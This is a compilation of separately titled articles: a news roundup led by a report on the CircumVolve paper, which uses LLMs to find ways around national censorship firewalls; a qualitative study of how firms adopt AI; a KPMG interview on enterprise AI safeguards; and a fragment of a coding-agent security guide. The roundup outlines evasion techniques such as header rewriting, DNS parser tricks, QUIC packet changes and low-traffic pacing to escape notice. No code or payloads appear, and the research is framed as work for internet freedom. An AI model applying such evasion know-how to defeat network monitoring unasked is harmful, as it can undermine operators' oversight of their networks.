Title: $1 of GPT-5.1 tokens finds new ways around China’s Great Firewall
Context: Those tests found the median API cost to the first successful evasion was less than $1 in token expenditure costs when using GPT-5
Full Text: Researchers have found new ways to evade China’s Great Firewall after spending just $1 worth of tokens. That result appeared last week in a paper titled “CircumVolve: Automated Discovery of Censorship Evasion Strategies Using Large Language Models” presented at the Conference on Computer and Communications Security run by the Association for Computing Machinery’s Special Interest Group on Security, Audit and Control. Penned by six researchers from the University of Massachusetts Amherst, University of Colorado Boulder, and activist group the Great Firewall Report, the paper points out that finding holes in the Great Firewall is a laborious process – so just the kind of task worth handing to AI. The authors came up with a tool they call “CircumVolve” and describe as “a system for automated discovery of censorship circumvention strategies across the full network stack.” “CircumVolve combines LLM code generation with iterative feedback-driven evaluation to produce verifiable and deployable evasion techniques,” they wrote. “CircumVolve models different censorship techniques as discrete scenarios, each capturing the specific context, protocol constraints, and blocking mechanisms of real-world censors. Within each scenario, evasion strategies are represented as executable Python programs that implement packet and protocol manipulations — from rewriting TCP/IP header fields, to crafting DNS queries that exploit parser ambiguities, to modifying the internal structure of encrypted QUIC Initial packets — while maintaining protocol correctness within tolerable bounds or strategically violating it when beneficial.” The authors tested CircumVolve on simulated censorship tools used by China, Iran, Pakistan, and Kazakhstan, and on virtual private servers deployed on clouds in those countries. Those tests found the median API cost to the first successful evasion was less than $1 in token expenditure costs when using GPT-5.1. The authors acknowledge that operators of censorship infrastructure might be able to observe CircumVolve at work, but feel its relatively small payloads – 80 KB of outgoing and 150 KB of incoming traffic – and 25-45-second pauses between tests might see it fly under the radar. “CircumVolve represents a first step in leveraging LLMs to accelerate the censorship-circumvention lifecycle,” the authors wrote. “By automating the labor-intensive tasks of protocol analysis, implementation, and testing, AI-driven approaches make studying circumvention capabilities far more accessible to the comparatively under-resourced Internet freedom community [and] demonstrates how AI-assisted systems can narrow the resource gap between Internet freedom advocates and well-funded censoring states.” Lenovo finally cracks monster datacenter profits Ever since acquiring IBM’s x86 server business in 2014, Chinese hardware giant Lenovo has struggled to turn a profit from datacenter sales, even as it expanded its business into storage, networking, and selling to hyperscalers. The AI boom has finally done what various strategy shifts and waves of hype could not: propel the company’s Infrastructure Solutions Group (ISG) to a $1 billion quarterly profit. In its Q2 results announcement [PDF] last week, the company revealed ISG revenue hit a quarterly record of $11.3 billion, up 178 percent year-over-year, and that lovely big profit. At a time when enterprise hardware supply chains are tight, Lenovo says it was able to increase shipments of x86 servers and even emerge as the largest vendor of such systems with 16 percent market share. Lenovo also claimed it’s moved further ahead as the planet’s premier PC provider, by pointing to 15 percent year-on-year growth for its intelligent devices group where quarterly revenue reached $17.4 billion. The company claims it has 23.8 percent of the PC market and now has seven percent more market share than its closest rival, Apple. The company said premium devices account for 63 percent of its PC business Overall revenue rose 48 percent year over year to $30.24 billion for the quarter. Indonesia’s glaciers are all but gone It may surprise readers to know that Indonesia, the nation that spreads across 17,000 islands in the tropical latitudes of 11°S to 6°N, is home to alpine regions sufficiently high that glaciers can form. Indonesia’s glaciers clung to the top of Puncak Jaya, aka Carstenz Pyramid, a 4,884-meter peak on New Guinea at 4°S. Sadly, an assessment published last week by NASA says the glaciers have probably melted to the point at which not much is left other than a few patches of ice. NASA last week posted images that show glaciers covering 4.31 km2 atop Puncak Jaya in 1988, and another from this year that shows most of that ice is gone. Images from September 2025 apparently showed just .09km2 of ice remained. “To qualify as a glacier, a body of ice generally has to be thick enough to flow downhill under its own weight, and it needs an area where snow builds up faster than it melts,” NASA’s Kathryn Hansen wrote. “Puncak Jaya’s remaining ice has thinned so much and broken into such small, stagnant patches that it no longer flows.” For what it’s worth, commercial operators run expeditions to Puncak Jaya. Peak-baggers seek it out because some consider it the highest mountain in Australasia/Oceania and therefore one of the “Seven Summits” – the highest point on each continent. The Reg won’t get into the debate about the validity of including Puncak Jaya on that list, but if you fancy some equatorial alpine action your correspondent recently climbed Malaysia’s 4,095m Mount Kinabalu. It’s an overnight walk that requires no technical skills or gear, but definitely demands supple knees. The peak was clearly glaciated in the distant past but snow is now extremely rare on Kinabalu. Australian bank giving away its bug-hunter Here’s an odd one: Australia’s Commonwealth Bank (CBA) created an AI-powered tool to scan its bespoke code for bugs, and has now packaged it as a free release called “CodeCheck.” The bank says analyzes the output of OpenAI’s Codex and Anthropic’s Claude Code with “a consistent process for analyzing code, investigating potential vulnerabilities and providing information to assist engineers.” Apparently, it is “ based on an approach used within CBA, but it is not the same as, and does not represent, the systems, tools or controls CBA uses internally.” The bank posted CodeCheck to GitHub, where it warns the project is “a one-time open-source release for businesses to evaluate” and that it will not actively maintain, update, or support the code. Japan’s space program hands some launches to Mitsubishi Japan’s Aerospace Exploration Agency (JAXA) last week announced it has reached an agreement with Mitsubishi Heavy Industries (MHI) to take over responsibility for running launches of its flagship H3 rocket when used in certain configurations. The deal means MHI will handle launches for H3s that use a pair of LE-9 liquid-fuel engines alongside two SRB-3 solid-fuel boosters. JAXA will continue running launches that use different, or experimental, configurations. Once JAXA is satisfied those new rigs are reliable, it plans to transition them to private operators, too. ®

Title: Working with AI
Context: We found: Sources of AI value
Full Text:
Nathan Wilmers, Maxim Massenkoff, Peter McCrory

Summary

How are businesses across the economy adopting AI? What bottlenecks and challenges have they faced? How can employers reorganize human expertise around increasingly capable models? To understand businesses’ experiences better, we conducted 66 interviews with 58 of Anthropic’s enterprise customers. We found:

Sources of AI value. Companies are deploying AI across a dizzying range of knowledge work tasks. In particular, they are increasingly using coding agents to bring software capabilities to nontechnical roles. Interviewees report that most uses of AI add value by increasing their output, rather than by cutting costs. They attribute this both to AI accelerating existing work and to its role in introducing novel product and service improvements.

Impact on employment. Across our interviews, we saw very few examples of domestic layoffs that were driven by AI automation. Although some companies reported hiring more due to AI, most companies reported hiring less due to AI. Many also reported reducing their use of contractors, particularly offshore ones. These reported cuts could be an early warning of job disruption in the international business services industry.

Bottlenecks. Companies reported a range of bottlenecks, including experts resisting AI deployment and tasks that are not accelerated by AI. As coding speeds up, for example, other tasks—like code review, sales, and strategic decision-making—increasingly need to keep pace.

Limits to top-down and bottom-up approaches. Many companies approach AI by identifying a workflow to automate and rolling out a top-down solution. This approach can lead to job insecurity, fears of workplace surveillance, and resistance from the experts needed to set up an effective and durable workflow. Companies that distribute AI tools and wait for bottom-up adoption see some valuable AI use but face bottlenecks from unequal adoption and single-task AI implementations.

Reorganizing for AI. Interviewees described the highest-value uses as involving meaningful reorganization. Some companies are broadening their employees’ roles to ensure individuals can take ownership over whole workflows, and are redeploying employees to the “bottleneck” tasks that AI models cannot do. Some also seek to empower employees by building out infrastructure to support nondeveloper coding and by providing broad-based internal access to business data. These companies are reorganizing to take advantage of ongoing model capability improvements rather than settling on a fixed approach that assumes AI tools will remain as powerful as they are today.

Introduction

The use of LLMs has exploded across the economy. How are human organizations reshaping around these strange new collaborators? Consider an employee at a midsize law firm that we spoke to. For years, the firm’s mailroom had followed the same protocol: a scanner sent PDFs of incoming correspondence to an inbox; a mail clerk opened each PDF, skimmed it, clicked “Save As,” renamed it, and placed it in the firm’s file system. The process took five minutes per letter. One day, a senior developer visited the mailroom to watch the mail being processed. In a month, he built an AI system that eventually became two API calls, which name the document based on its first page and then assign it a place in the firm’s document system. The mail clerks “were blown away.”

An employee at another law firm we interviewed hoped AI would create “a second brain” for the firm. (“For higher-level stuff, it just opens up possibilities.”) But the firm struggled to get everyone to use AI effectively. Demand letters to potential defendants were filled with excessive em dashes and occasional errors. Attorneys building apps kept “running into the wall based on hallucinated menus or buttons that don’t exist.” Others worried about confidentiality and data security, or they just didn’t “have time to get onto this AI train.” A few power users inundated the firm with AI prose, “casually sending Claude-prompted seven-page instructions to the IT team.”

A third law firm we spoke to adopted AI early and achieved strong uptake. One of the firm’s early projects was an AI timekeeping system that saved attorneys work tracking billable hours. IT staff saw parts of their job automated, but they then focused on building secure infrastructure to host apps and manage context that served the rest of the firm. As AI tools spread, the firm realized that associates were no longer needed to write first drafts of certain legal documents. But without writing, “how does an associate know if that’s a good draft or a bad draft?” So it introduced a new workflow where junior lawyers were “required to really take that first [AI-written] draft and work with a senior attorney,” pairing off and marking up and editing the draft together.

These three firms applied the same technology in the same industry but in different ways. The first firm automated a workflow, creating efficiency gains but risking job displacement for the mail clerks. For the second, bottlenecks to adoption and effective implementation prevented job displacement but also blunted productivity gains that would benefit the firm. The third reorganized work without eliminating any jobs, because effective use of the technology required redeploying employees toward new tasks. The firm redesigned roles to maintain human expertise as a complement to increasingly capable AI models.

In this article, we explore the connections between AI-driven value and work reorganization through 66 face-to-face interviews conducted across 58 companies in the US, all of which are in the midst of adopting AI. We interviewed executives, managers, and individual contributors. We talked to employees at AI-native startups and 100-year-old businesses. We interviewed people at manufacturers and tech companies. We spoke with structural engineers, dentists, and accountants; employees at hedge funds, law firms, and private equity firms; a property manager, a trucking company, and a publisher. They’re all Anthropic customers, but many also use other AI tools. They were selected for this study because of their range across industry, size, and AI usage, though they are not a random or systematically representative sample.

As in other qualitative research, we present stories and a framework to organize them, with the expectation that follow-up quantitative research can test these ideas further. The interviews were done anonymously, both for the interviewees and their companies. Any names in the report are pseudonyms.

How are businesses adapting to AI?

In our interviews, we gained insight into how AI has become embedded in businesses across the economy. Some of the AI agents we heard about are sending faxes back and forth, as doctors’ offices refer and intake patients. Other agents are giving advice to technicians when an X-ray machine breaks, and still others are then marking up the X-rays to help patients better understand them. Agents are reading property deeds from the 1800s and working out delivery routes for gaming machines. Recently, an AI agent analyzed a company’s organizational chart and suggested departments where the company could add headcount: “Three heads here, we need to add two there, zero here.”

Mostly, agents are writing code. Interviewees described 100 pieces of software that they wrote with AI in enough detail that we could categorize them. Eighty percent of this software automated previously manual work, like spreadsheet-based financial updates or taking meeting notes. Another 20% replaced existing software, often previously purchased from outside vendors. Agents are building apps for private parking enforcement, 401(k) audits, and trademark checks for new product names. They are making dashboards to track portfolio companies, equipment repairs, and debt collectors’ phone calls.

How have human organizations harnessed these new assistants? We use our interviews to explore several aspects of these deployments. We begin by estimating how much value interviewees ascribe to AI deployments and relate that to a measure of how much organizational change they required to implement. Figure 1 plots nearly 300 AI applications that interviewees discussed in detail. We define an application as a specific AI use case in a specific company. We coded discussions of each application according to the value interviewees attributed to it and the extent to which the organization had to make significant organizational changes to accommodate it. These value assessments are primarily qualitative descriptions on the part of interviewees, not typically based on A/B tests or other quantitative assessments.1

Figure 1 shows that many light-touch AI applications can fit into an existing organizational structure, like ad hoc data analysis or slide deck design. However, many of the simplest applications were rated as relatively low value by the employees who described them. Higher-value deployments tend to require changes to processes, like AI review of every code commit, or roles, like a marketing manager who edits skill.mds containing branding guidelines instead of designing individual documents.

Several interviewees described AI adoption as essentially a challenge of organizational change: flattening organizations, shifting reporting lines, or dropping functions. At one firm, for example, executives decided that junior analysts were no longer necessary because executives could complete their own SQL queries. As one accountant put it, “It’s a combination of process re-engineering and systematic discipline.”

There are several reasons why the most valuable applications led to significant organizational change. In some cases, the AI applications required a structural change in order to be successful, such as when a policy had to be clarified so that AI agents could rigorously apply it in an assessment workflow. In other cases, initial success spurred excitement about making larger organizational changes to further harness AI. In others, the success of using AI forced downstream changes. One commercial real estate company saw its staff start sending out client-facing documents themselves. But this meant they had violated company rules that asked employees to route external materials through the marketing department. As an IT director explained, “That’s good because, hey, we got another client. That’s bad because our standard operating procedures are starting to fall apart.” These stories echo academic research that shows that organizational change is necessary to derive value from transformative technologies.

Next, we studied what, exactly, value means in the context of AI adoption. Figure 2 shows that interviewees described most AI applications as adding value by increasing a firm’s output rather than cutting costs. Around half of the applications that increased output were due to AI accelerating or expanding existing work. The other half were the result of AI improving the quality of products and services or creating new products altogether. For instance, a medical group improved service quality by using AI to give patients an up-front estimate of after-insurance costs. A commercial real estate manager mocked up vacant units for potential tenants with their own branding (“Here’s what your sandwich place would look like in this space”). A dental company introduced an after-hours AI answering service, so patients’ midnight calls no longer went to voicemail.

In one-tenth of the use cases laid out in Figure 2, value was captured directly by employees, who were either doing more enjoyable work or were doing less work altogether. One manager described how bringing AI into his construction company meant that “work can be a joy again instead of a difficult, painful thing.” Senior engineers at an engineering consultancy described being thrilled to be free of tedious standards reconciliation work.

This sentiment was particularly common in cases where AI sped up peripheral tasks that were distracting to experts, like making pitch decks for product developers or preparing CRM reports for sales representatives. An employee at one construction materials company said they appreciated a whole series of small, personal automations that were “changing my life because now I do so much less work.” An executive at a food industry company remarked on “the number of people who just have thanked me because they could take a vacation.” (This is consistent with a Danish survey that found that around 10% of employees who save time with AI chatbots say they take more breaks or have more leisure time.) But some managers were less enthused. One frustrated executive described his employees as hiding their AI-enabled successes, saying, “They don’t want you to know, because they want to use those 10 hours a week to go walk their dog.” A private equity manager suspected that, among workers at companies in his portfolio, “some of them are working basically half days.”

Our interviews show substantial variation in the degree and kind of value companies derive from AI. The highest-value applications involve wide-reaching organizational change. These patterns warrant attention to the specifics of AI deployments across these companies. In the following section, we assess three common adoption strategies that we observed in our interviews: top-down automation, bottom-up experimentation, and a broader reorganization around AI.

Top-down automation

Mark racked his brain: had he messed anything up recently? As a paralegal at his law firm, he was rarely called into a partner’s office and even more rarely ended up in an office with two of the firm’s equity partners. They wanted to “talk about his AI use,” a topic that filled him with dread. He had already realized that models’ continued improvement would mean “the beginning of the end for my work.” He worried, “Why would anyone want to employ someone like me?”

Mark’s fears were understandable—and far from unique. This past year, AI has loomed especially large in performance assessments across industries. Some of the most sobering moments in our interviews were when managers described making difficult decisions to terminate employees who wouldn’t adopt AI. One engineering leader described experiencing a “morale hit” after the company terminated a developer who, they said, “just kind of shut down instead of trying to embrace it.” As one person at a financial services firm said of their company’s AI push, “You either get on board or don’t. And this might not be the place for you [if you don’t].” An engineering executive described grappling with the massive performance differences he saw emerging between AI users and AI resisters. Ultimately, he said, “we had a couple people who started off extremely anti-AI, and they moved a little along the spectrum, but not enough, and so we ended up letting them go.” But even heavy AI users were not immune to fears of losing their jobs or falling behind: one operations manager said she woke at 3 a.m., fearing for her career, and asked Claude, “How do I make sure I set myself apart so that AI can’t do everything that I do?”

These cases were rare. Overall, people at five companies described pushing out employees who would not adopt AI, and only two had seen AI automation fully eliminate a position and lead to someone losing their job. (By contrast, 10 companies reported hiring more due to AI, primarily into AI implementation roles and to bolster IT support, and others had grown rapidly for a variety of business reasons.) But layoffs weren’t the only adverse employment effect. People at two-thirds of the companies we spoke to reported reduced hiring due to AI: as one person put it, “We may not be firing, but we’re not hiring.” A third of these hiring declines were due to companies actively shrinking functions through attrition without backfilling the roles. But most were the result of companies forgoing hiring that, in the absence of AI, they would have needed to scale their businesses—a finding consistent with past work suggesting that AI-native startups employ fewer workers. As an engineering leader at a health management company put it, “We’ve added a lot of capacity by buying tokens instead of hiring people.”

Beyond terminations and reduced hiring, nine companies described cutting contracted software developers, customer service representatives, legal counsel, and a range of back-office functions, many of which they had already offshored. These outsourced jobs, which are based on modular tasks (self-contained pieces of work that can be handed off separately), sometimes without high expectations for quality, have been particularly vulnerable to replacement. An executive at a company that worked with an offshore design firm said, “We’ve since fired them because now we can get better quality things faster and cheaper” with AI. A finance company downsized well over 100 offshore data and developer contractors. An operations leader at a software company explained that with AI-driven contract reviews, their “legal bill has just completely disappeared.”

These reductions were often the result of top-down workflow automation. For example, one financial technology company adopted AI customer service agents and cut its offshore customer service contracts. Instead of managing human customer service representatives and fielding escalated calls themselves, customer service managers now review transcripts of conversations with the AI agents and edit the agents’ prompts, knowledge graphs, and general operating procedures. One company built an agent as part of a document review workflow. The agent reads submissions against the company’s approval policies and passes a structured analysis to human reviewers. Deploying the agent led the company to cut the number of reviewers it expected to hire for the coming year by more than 90%.

These agentic automations—in which AI agents are given instructions and then operate largely autonomously—are more advanced than the chatbots that still define many employees’ experiences with AI. AI-native startups take these automated workflows to the extreme, both in the products they offer and in how they organize their own work. One Chief Operating Officer walked us through his one-stop agentic portal for operations, noting that 90% of his operations budget was spent on AI tokens and 10% on headcount. He said of his approach, “Look, don’t hire anybody on the back office. I’m going to automate it.”

One AI startup founder told us bluntly that their company’s pitch was to replace the back-office workers their customers currently employed: “You’re trying to fire your [data] labelers, I guess.” A founder of a marketing startup described how their “marketing factory” had flipped from humans doing 80% of the work and AI doing 20% to the opposite. Another startup founder estimated that their company spent as much on internal AI use as on labor, and that it would need three times as many employees without AI. Overall, the six startups that gave us an estimate said they would need, on average, four times as many employees without AI.

Another top-down deployment involves using AI to monitor employees more closely. Under the Anthropic Usage Policy, employee monitoring and its scope must be disclosed to employees, and the monitoring must be limited to employers’ systems for security, safety, logistics, or compliance purposes. The policy further defines employment decisions, like evaluating an employee’s performance, as high-risk, and requires a human in the loop and disclosure to employees. The workplace monitoring we heard about appeared to be compliant with these restrictions, and did not always involve Claude.

One engineering executive explained, “You want to make your work legible to your manager. But nowadays I think you want to make your work legible to the agents your manager uses.” This executive, and others we spoke to, were ambivalent about the implications of these capabilities, seeing both the benefits of more accurate performance feedback and the risks of workplace surveillance—a “panopticon effect,” as one executive put it. An operations supervisor said he started each day by reviewing an AI report on the throughput and error rate of each member of his 12-person document extraction team: “If somehow there was a lag, then I can question back to them, ‘Okay, what happened this hour?’” Another operations director set up an AI-based assessment process for the firm’s customer service representatives. An agent codes their transcripts according to dozens of performance dimensions, then routes the results to a dashboard monitored by the customer service representatives’ managers.

Top-down deployments like these shift power from employees to executives and owners. But they can also be brittle, because they can quickly become out of date or obsolete. For example, the dozens of performance dimensions that customer service representatives were rated on are scored by a two-year-old model and are not taken seriously by managers. Similarly, a law firm built a series of automations for document management but ended up with a number of low-quality “zombie” apps that were hardly used. One engineering leader described a chatbot their company had built for customer service workers—an early experiment built on an open-source chat interface—as “super basic; just chat and answer.” They said the system was difficult to update and maintain, and that “we haven’t spent any more time or money on it.”

These systems are largely built by outside vendors rather than developed directly by internal users, and are marketed as targeted solutions for a specific industry and function. In interview after interview, companies described how improvements in model capabilities rendered these products outdated. As one employee said of one such system, “It’ll be obsolete in three months.” One executive despaired of the up-front investments needed to build top-down workflows as models rapidly improved: “It’s almost like we’re trying to throw darts at a spinning dart board.”

Similar problems emerge in even the most ambitious automation attempts, those targeting knowledge work that requires deep expertise. Standing up effective workflows in these areas typically requires experts to design the agents’ prompts and evaluate their outputs. But this means experts are effectively being asked to build and maintain the very systems that could replace them. One software engineer, who we’ll call Ellen, described her first encounter with automated coding: “I don’t think that my job is secure… software engineers are going to be obsolete.” Another employee put it even more bluntly: “If I’m open to this, I’m essentially building my own coffin.”

Managers also end up facing understandable resistance from employees. Recall the company that used AI to automate an approval workflow. It intended to double the output of expert reviewers and reduce hiring by more than 90%. The human reviewers balked. As one executive put it, “Just because [a reviewer] can now do double the amount of cases, how do you incentivize them to do double the amount of cases?” The company considered offering gift cards to get reviewers to comply. At the time of our interview, the executive noted that while some reviewers were down to two minutes of review per submission, “there’s some that are hanging out in the 10-plus minutes.”

Likewise, recall the senior developer who’d automated one law firm’s mailroom. Fresh off that success, he told us, his COO put him on a more ambitious project: using AI to check for conflicts of interest among the firm’s prospective clients. Under the existing process, conflict staff would run a search, print out any hits, and pass “the buck right onto the attorney.” In under a week, he built a workflow that let attorneys request a check from an AI agent in plain language, which then routed the request through conflict-checking software. But the new workflow left it to the conflict staff to work through each potential conflict—and would often surface the types of complex and difficult conflicts that had previously been passed to the attorneys. Faced with this new work, the staff pushed back, the agent was shelved, and the firm returned to its old process.

Top-down AI deployment is already changing hiring and contracting patterns by automating whole workflows. It is also prompting resistance from experts and raising fears of workplace surveillance. That resistance can result in abandoned or fragile automations.

Bottom-up experimentation

For many companies, the problems of layoffs or the AI panopticon haven’t really arrived. Recall Mark, the paralegal who worried for his job after being called in to meet his bosses. The meeting was not the one he expected. Mark explained to us that at the meeting, the partners noted that his demand letters were better than others’ and asked him how he'd prompted AI so effectively. Mark said he’d felt hesitant about sharing his workflows. He remembered telling them, “That’s my secret sauce. I have my own workflow, my own process, and respectfully—please, do not take this the wrong way—I do not want to share with anyone.”

This pattern, of a few individual contributors thriving with AI, came up in many of our interviews, particularly for companies doing bottom-up deployments. Nontechnical knowledge workers with substantial expertise in a given domain often derived the highest value from such deployments. This is in line with prior research on Claude Code usage, which found that nontechnical experts had the highest task success rates. One accountant described “vibe-coding” an app that audits whether the 401(k) payments employers process actually end up in the investment fund they are intended for. This audit process requires matching payment records across dozens of different systems and providers and previously took accountants 80 hours. “I was able to show that to our team. They were like, ‘Wow, this is super cool,’” the accountant said. “They looked at me and they were like, ‘You built this?’ And I was like, ‘Sort of. I told Claude what I needed to do.’”

In these cases, coding tools clearly empower domain experts. A former airport operations manager told us about building a vehicle tracking app, saying, “I was wielding AI like Excalibur.” Quality assurance supervisors at a chemical plant built an app to monitor filtration rates despite having no coding experience: “They know they’re using Python because [Claude] told them.”

However, even the most dramatic success stories were often limited to changes that could be made from the bottom up. An employee at a manufacturing company explained, “We’re getting just these pockets of really cool stuff that could be great for our organization, but not necessarily a way to enable everyone to use that.” Swapping out a single software tool or building a new personal productivity app can be done by ambitious individual contributors. One investment manager at a real estate firm developed a deal tracker that replaced a third-party product that cost $10,000 per year. Another created a legacy Windows XP app that would have cost $250,000 to replace.

While many of these homegrown software replacements seem like notable upgrades at first, they still require review and ongoing maintenance—which means they can result in relatively small savings overall. How customized (and, therefore, how complex) does a deal tracker really need to be? An operations director at a large law firm considered building out dashboards to monitor their recruitment pipeline, but realized:

That’s small beans. There are plenty of SaaS [products] out there that can help you make dashboards. What is it—$30 a month, $50 a month, $100 a month, even? So, we can save that money by vibe coding. But the maintenance cost obviously goes up as well, and we have to get our talent manager to start maintaining a vibe-coded dashboard.

Likewise, an engineer at a government services firm considered using AI to customize their software but decided that even if it helped them win a few contracts, “we don’t think it’s super sustainable from the maintenance and support side still. It just requires a lot of staffing.”

Figure 3 summarizes the 140 pieces of software that interviewees described as being built with AI, broken down by the software’s purpose and the role of the person who worked with AI to build it. It shows that product features and technical infrastructure remain solidly within the purview of technical employees, while nontechnical employees focus on internal apps and dashboards. This implies that the bulk of software built by nondevelopers still requires support or infrastructure from technical employees.

Beyond maintenance, these one-off, bottom-up coding projects can create substantially more work elsewhere in the organization, either in the last mile of production or through uneven acceleration across different tasks. The 401(k) audit app prototype mentioned above had to be implemented by a third-party vendor and was still not in active use months later. An engineer at an equipment manufacturer realized that AI could translate the text on their product surfaces into 10 different languages, but “we don’t have anybody that can answer the phone in those languages… So we ended up turning that [feature] off. We didn’t even ship it.” As coding accelerates relative to other functions, it hits bottlenecks: “Without the proper scaffolding in place, that bottleneck is immediate.”

These uneven changes in productivity can also run into organizational politics. As one manager put it, “In our world, it’s like Billy in Sales doesn’t trust Sally in Marketing.” Exacerbating these conflicts is the fact that the uneven adoption of AI can impose costs on nonadopters. Power users lob “Claude grenades” and shoot “Claude cannons” at the rest of the organization, while AI skeptics respond, “Guys, I’m not reading your AI email.” In one case, an AI agent put together a set of profit and loss projections that a Chief Investment Officer realized were based on outdated assumptions. As one frustrated executive put it, “A mediocre engineer with an AI is a menace to society.”

Figure 4 summarizes the bottlenecks to deriving value from AI discussed across the interviews. Many involve the uneven acceleration of tasks. The difficulty of reviewing AI outputs came up again and again, as their volume swamped scarce human attention. In one incident, an agent added an errant “S” to an API endpoint and broke a carefully planned feature release. In other cases, when coding accelerated, other functions could not keep up. Uneven employee adoption was also common, as the enthusiasm of power users failed to rub off on their peers. Companies also often noted that they lacked the necessary context and infrastructure to support AI-generated software. By contrast, customer skepticism and regulation were rarely cited as bottlenecks. The bulk of bottlenecks appear to emerge from the process of adopting AI within the organization itself.

These examples evoke Paul David’s mill buildings retrofitted with electric engines—a classic account of why productivity growth may lag technological implementation. Individual contributors can only revamp processes and decisions within their own small corners of an organization, while the broader division of labor remains in place. As one hotel services operations director put it, “The individual doesn’t have the authority to change the work. They can only apply it in their own area.” The head of AI at an investment firm voiced similar frustration with the bottom-up projects he had seen: “How can we upskill and tear down our workflows and rebuild like we were starting the company again now?… Not ‘Claude, write the email,’ but, ‘Why are you even getting the email?’”

Title: KPMG's Todd Lohr on AI when your data is also your clients' data
Context: We’ve followed Anthropic very closely since its founding, and its mission was intriguing from a partnership perspective because we share a lot of the same values
Full Text:
KPMG is one of the world's largest professional services firms, with more than 276,000 employees providing audit, tax, and advisory services across 138 countries and territories. Todd Lohr, KPMG US Vice Chair and Head of Client Technology & Innovation, focuses on bringing AI to clients through products and platforms. He has worked on KPMG's AI capabilities for more than a decade.

Much of the data KPMG handles belongs to its clients, often in highly regulated industries. Lohr spoke with us about what that means for adopting frontier AI, how embedding enterprise safeguards can unlock AI capabilities and accelerate responsible deployment, and where Enterprise Frontier Safeguards will fit.

Why did KPMG decide to work with Anthropic?

We’ve followed Anthropic very closely since its founding, and its mission was intriguing from a partnership perspective because we share a lot of the same values.

At KPMG, trust is foundational. It's what clients expect from us across our core business of audit, tax, and advisory, and it's what underpins confidence in the capital markets.

What are frontier models changing about your business right now?

Ten years ago we were focused on using predictive analytics, machine learning, and bringing very bespoke applications of LLMs to our clients. The last three years have been marked by bringing general intelligence to both our clients and KPMG workforce. Now we're at another pivot point, where our strategy is to embed our industry and domain knowledge, like tax and legal, into AI platforms and products. We’re working with partners like Anthropic not only on how we help our clients disrupt their industries but also how we disrupt professional services more broadly.

Our tax business runs on Digital Gateway (opens in new tab), which we see as a market-leading platform for how we deliver services. With Claude now integrated into the platform, we’ve introduced Digital Gateway Powered by Claude (opens in new tab), bringing frontier AI directly into how we work and deliver for clients with greater intelligence, speed, and scale.

More capability means more value, but also more potential for misuse. How do you weigh the two?

I’m optimistic about what AI can bring to humanity and to businesses, from healthcare and longevity to agriculture. We’re already seeing AI create entirely new ways to serve our clients in all industries.

Healthcare is a good example. Emerging capabilities like ambient listening can generate clinician notes directly from patient conversations, and physicians tell us this type of tool could give them back hours each day. Clinicians remain firmly in the loop, and every hour they spend with patients rather than with systems is an hour that can improve care.

With that said, the same technology can create security and safety challenges. There are going to be people who use it for nefarious reasons. It’s critically important that as an industry we understand that, take an honest look at how it’s being used, and create a responsible, safe, and secure framework for how we deploy these technologies.

That’s why our Trusted AI framework (opens in new tab) is foundational to how we innovate at KPMG. As a professional services firm, we take seriously our responsibility to help organizations realize the value of AI safely and securely while preparing for what’s next. That includes rigorous testing, ongoing monitoring, human oversight, and independent assurance to help ensure AI systems remain transparent, reliable, and aligned to their intended purpose.

Additionally, we're using Claude Mythos to identify system vulnerabilities, and cyber AI more broadly to defend against them.. This is an area where we’re investing heavily alongside partners like Anthropic.

KPMG had an early look at Enterprise Frontier Safeguards (opens in new tab). What was your reaction?

It was positive to see how much thought and intention Anthropic put into the safeguards and working with partners on the program. Specifically, what stood out was data retention: how we will be able to keep the data within our organization and still have access to frontier models.

That's critically important for a firm like KPMG because we are the trustee of our clients' data in some of the most sensitive, regulated environments. We want our clients and firm to have the benefit of the powerful combination of that data and AI, but we need to do it at all times in view of how our clients want us to use their data, and what we can use it for.

What will Enterprise Frontier Safeguards let you do that you couldn't before?

Enterprise Frontier Safeguards will allow us to move faster, with confidence, in how we're able to use AI and where we can use it. One of the key tenets of the safeguards architecture will be the ability for us to retain data in cloud infrastructure we control.

Where we have regulated or highly sensitive data, having these safeguards built-in will allow us to confidently accelerate our AI deployment across those highly regulated and sensitive client engagements.

How will the automated misuse review in Enterprise Frontier Safeguards fit with KPMG's own Trusted AI program and risk processes?

As AI capabilities become more powerful and autonomous, organizations need the ability to identify potential misuse, emerging risks, and unintended outcomes at a scale that manual processes simply can't support. Automated misuse review helps provide that additional layer of oversight by continuously evaluating how AI systems are being used and flagging signs of serious misuse for our team to review.

We see automated misuse review as a natural extension of our Trusted AI approach and an enhancement to our existing risk management processes. Combining automated monitoring, KPMG human oversight, governance controls, and independent assurance creates a stronger and more resilient framework than any one approach alone.

What do you expect from AI vendors when it comes to safeguards?

Trust is paramount to our brand. It's literally our business model. We’re not going to make a trade-off between AI capability and trust. We expect both.

The more capable AI models become, the more important those safeguards become, and strong guardrails are what give organizations the confidence to put powerful AI to work at scale. We have an expectation with all of our vendors that safety, security, the safeguards around the use of AI, and alignment to our Trusted AI beliefs and programs are central to how we work together.

We have to strongly prioritize safeguards in every aspect of our business, and certainly in our use of AI.

What would you tell other leaders weighing frontier models right now?

You need to use these models. I can't think of a business or an industry that is not going to have some level of disruption from AI. "Wait and see" is not likely a sustainable answer for most organizations.

So, you have to adopt and secure at the same time. Think through the safety and security aspects, define the guardrails, and put them in place so you can move faster through the enterprise. Most organizations aren't going to have the luxury of not deploying these models. But they're going to have to do it in a way that's aligned to their business strategy and goals and done in a safe and secure manner.

What are you building with Claude next?

We've already started to put Claude to work to build AI-native ways of working in our business, specifically in tax and private equity. We've also built frontier AI cybersecurity services, and we’re using Claude Mythos to look at vulnerabilities across the enterprise, and then using AI to quickly patch and secure the enterprise against them.

What you're going to see in the next several months is an acceleration effect. As AI enables organizations to identify vulnerabilities and risks faster, AI will also become increasingly important to responding at that same speed.

Learn more about Anthropic’s Enterprise Frontier Safeguards (EFS) (opens in new tab), now in public beta. EFS provides state-of-the-art detection of sophisticated misuse, while remaining compatible with zero data retention (ZDR): neither Anthropic nor any cloud providers retain enterprises’ data.

Context: Unlike traditional malware, it can try multiple routes the attacker doesn’t have to proactively define
Full Text:
Shipping fast and secure

Coding agents likely write code and open pull requests at your organization already. For many leading enterprises, they are reviewing, testing, and merging it too.

For example, after standardizing on Claude Code across its engineering organization, Salesforce¹ reported:

79%

more pull requests merged per developer at Salesforce

5%

fewer total incidents at Salesforce

As agents do more, technical and security leaders must mitigate risks like prompt injection and privilege abuse with layered controls such as checked permissions and bounded environments.

The first two chapters focus on scoping the risk. We discuss the requirements every AI provider should meet and four agentic risks to mitigate.

The next three chapters focus on bounding the risk. We highlight the defensive layers you can deploy with Claude Code as well as how to centrally manage and enforce those controls.

